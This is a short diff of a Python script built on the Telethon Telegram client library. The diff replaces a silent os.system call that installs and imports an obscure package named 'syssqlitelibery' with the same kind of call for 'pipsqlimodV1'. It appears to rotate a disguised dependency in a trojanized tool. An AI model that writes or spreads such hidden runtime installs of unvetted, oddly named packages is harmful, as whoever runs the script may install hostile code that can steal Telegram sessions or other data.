@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitelibery")
-import syssqlitelibery
+os.system("pip install pipsqlimodV1")
+import pipsqlimodV1
 import requests
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
